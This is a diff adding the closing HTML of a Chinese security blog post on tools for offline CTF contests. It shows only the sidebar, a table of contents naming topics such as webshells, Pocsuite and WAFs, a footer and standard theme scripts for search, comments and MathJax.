+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、linux-tcpdump使用"><span class="nav-number">1.</span> <span class="nav-text">一、linux tcpdump使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1、过滤主机"><span class="nav-number">1.1.</span> <span class="nav-text">1.1、过滤主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2、过滤端口"><span class="nav-number">1.2.</span> <span class="nav-text">1.2、过滤端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3、网络过滤"><span class="nav-number">1.3.</span> <span class="nav-text">1.3、网络过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4、协议过滤"><span class="nav-number">1.4.</span> <span class="nav-text">1.4、协议过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5、常用表达式"><span class="nav-number">1.5.</span> <span class="nav-text">1.5、常用表达式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、一句话木马"><span class="nav-number">2.</span> <span class="nav-text">二、一句话木马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三、webshell爆破"><span class="nav-number">3.</span> <span class="nav-text">三、webshell爆破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四、批量发包程序"><span class="nav-number">4.</span> <span class="nav-text">四、批量发包程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五、Pocsuite"><span class="nav-number">5.</span> <span class="nav-text">五、Pocsuite</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六、批量上传文件"><span class="nav-number">6.</span> <span class="nav-text">六、批量上传文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七、权限维持"><span class="nav-number">7.</span> <span class="nav-text">七、权限维持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#八、日志记录"><span class="nav-number">8.</span> <span class="nav-text">八、日志记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#九、文件监控"><span class="nav-number">9.</span> <span class="nav-text">九、文件监控</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#十、WAF"><span class="nav-number">10.</span> <span class="nav-text">十、WAF</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/';
+          this.page.identifier = '2017/05/16/CTF线下赛相关工具/';
+          this.page.title = 'CTF线下赛相关工具';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
